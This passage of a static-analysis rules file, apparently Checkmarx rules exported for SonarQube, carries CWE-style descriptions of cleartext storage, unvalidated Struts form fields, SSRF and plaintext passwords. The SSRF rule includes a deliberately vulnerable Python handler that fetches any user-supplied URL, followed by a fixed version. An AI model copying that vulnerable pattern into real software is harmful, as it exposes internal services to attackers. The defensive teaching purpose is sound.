&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_311_Related Attack Patterns" id="oc_311_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org31.html" target="_blank"&gt;31&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Accessing/Intercepting/Modifying HTTP Cookies&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org37.html" target="_blank"&gt;37&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Lifting Data Embedded in Client Distributions&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org65.html" target="_blank"&gt;65&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Passively Sniff and Capture Application Code Bound for Authorized Client&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org117.html" target="_blank"&gt;117&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Data Interception Attacks&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org155.html" target="_blank"&gt;155&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Screen Temporary Files for Sensitive Information&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org157.html" target="_blank"&gt;157&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Sniffing Attacks&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org167.html" target="_blank"&gt;167&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Lifting Sensitive Data from the Client&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org204.html" target="_blank"&gt;204&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Lifting cached, sensitive data embedded in client distributions (thick or thin)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org205.html" target="_blank"&gt;205&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Lifting credential(s)/key material embedded in client distributions (thick or thin)&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org258.html" target="_blank"&gt;258&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org259.html" target="_blank"&gt;259&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org260.html" target="_blank"&gt;260&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_311_References" id="oc_311_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;[REF-11] M. Howard and
D. LeBlanc. "Writing Secure Code". Chapter 9, "Protecting Secret Data" Page
299. 2nd Edition. Microsoft. 2002. &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;[REF-17] Michael Howard, David LeBlanc
and John Viega. "24 Deadly Sins of Software Security". "Sin 17: Failure to Protect Stored Data." Page
253. McGraw-Hill. 2010. &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_311_Content History" id="oc_311_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-15&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Veracode&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Suggested OWASP Top Ten 2004
mapping&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Relationships, Other Notes,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-10-29&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Applicable Platforms, Common Consequences,
Demonstrative Examples, Description, Detection Factors,
Likelihood of Exploit, Name, Observed Examples, Potential Mitigations,
References, Related Attack Patterns, Relationships, Taxonomy Mappings,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-04-05&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Related Attack Patterns&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Failure to Encrypt
Data&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Failure to Encrypt Sensitive
Data&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_663</key><name>Struts_Form_Field_Without_Validator</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Struts: Form Field Without Validator&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;105&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Variant)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_105_Description" id="oc_105_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The application has a form field that is not validated by a
corresponding validation form, which can introduce other weaknesses related to
insufficient input validation.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_105_Time of Introduction" id="oc_105_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_105_Applicable Platforms" id="oc_105_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Java&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_105_Potential Mitigations" id="oc_105_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Ensure that you validate all form fields. If a field is unused, it is
still important to constrain them so that they are empty or
undefined.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_105_Other Notes" id="oc_105_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Omitting validation for even a single input field may give attackers the
leeway they need to compromise your application. Unchecked input is the root
cause of some of today's worst and most common software security problems.
Cross-site scripting, SQL injection, and process control vulnerabilities can
stem from incomplete or absent input validation. Although J2EE applications
are not generally susceptible to memory corruption attacks, if a J2EE
application interfaces with native code that does not perform array bounds
checking, an attacker may be able to use an input validation mistake in the
J2EE application to launch a buffer overflow attack. Some applications use
the same ActionForm for more than one purpose. In situations like this, some
fields may go unused under some action mappings. It is critical that unused
fields be validated too. Preferably, unused fields should be constrained so
that they can only be empty or undefined. If unused fields are not
validated, shared business logic in an action may allow attackers to bypass
the validation checks that are performed for other uses of the form.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_105_Weakness Ordinalities" id="oc_105_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_105_Relationships" id="oc_105_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;20&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=20" target="_blank"&gt;Improper Input Validation&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Seven Pernicious Kingdoms &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;700&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;101&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=101" target="_blank"&gt;Struts Validation Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('105_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_105_Causal Nature" id="oc_105_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_105_Taxonomy Mappings" id="oc_105_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Struts: Form Field Without Validator&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_105_Content History" id="oc_105_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;7 Pernicious Kingdoms&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes, Taxonomy Mappings,
Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4422</key><name>SSRF</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker can abuse this flaw to make arbitrary requests, originating from the application server. This can be exploited to&amp;#160;scan internal services; proxy attacks into a protected network; bypass network controls; download unauthorized files; access internal services and management interfaces; and possibly control the contents of requests and even steal server credentials. &amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application accepts a URL (or other data) from the user, and uses this to make a request to another remote server.&lt;/div&gt;
&lt;div&gt;However, the attacker can inject an arbitrary URL into the request, causing the application to connect to any server the attacker wants. Thus, the attacker can abuse the application to gain access to services she would not otherwise be able to access, and cause the request to ostensibly originate from the application server.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Do not connect to arbitrary services based on user input.&lt;/li&gt;
&lt;li&gt;If possible, the application should have the user's browser retrieve the desired information directly.&amp;#160;&lt;/li&gt;
&lt;li&gt;If it is necessary for the&amp;#160;application to proxy the request on the server, explicitly whitelist the allowed target URLs, and do not include any sensitive server information.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Python&lt;/h3&gt;&lt;h4&gt;Retrieve and Display Contents of URL&lt;/h4&gt;&lt;pre&gt;def do_GET(self):
    location = urllib.parse.urlparse(self.path)
    query = location.query
    
    url = urllib.parse.parse_qs(query)['url']
    
    response = urllib.request.urlopen(url)
    if response.status == 200:
        data = response.read()
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    &lt;/pre&gt;&lt;h4&gt;Validate and Redirect User's Browser Instead&lt;/h4&gt;&lt;pre&gt;def do_GET(self):
    location = urllib.parse.urlparse(self.path)
    query = location.query
    
    url = urllib.parse.parse_qs(query)['url']
    
    if url.startswith('/') or url.startswith("https://" + location.netloc + "/"):
        self.send_response(302)
        self.send_header('Location', url)
        self.end_headers()
        &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1674</key><name>Plaintext_Storage_of_a_Password</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application accesses the system database using a password. This password is stored in plaintext, without encryption. This could allow an attacker that gains access to the application storage to steal the application's database password, and connect directly to the database while&amp;#160;impersonating the application.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application retrieves the database password and uses it directly to open a connection to the database. The application does not decrypt the password before using it, since it is stored in plaintext.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not store any sensitive information, such as database passwords, in plain text.&lt;/li&gt;
&lt;li&gt;Safely&amp;#160;encrypt application passwords, using proper methods of encryption. If the original password must be retrievable, e.g. to connect to the database, use AES-CBC or GCM with a strong encryption key and random IV.&amp;#160;&lt;/li&gt;
&lt;li&gt;Implement proper key management, including dynamically generating random keys, protecting keys, and replacing keys as necessary.&amp;#160;&lt;/li&gt;
&lt;li&gt;Alternatively, encrypt the password using platform mechanisms or a hardware device.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
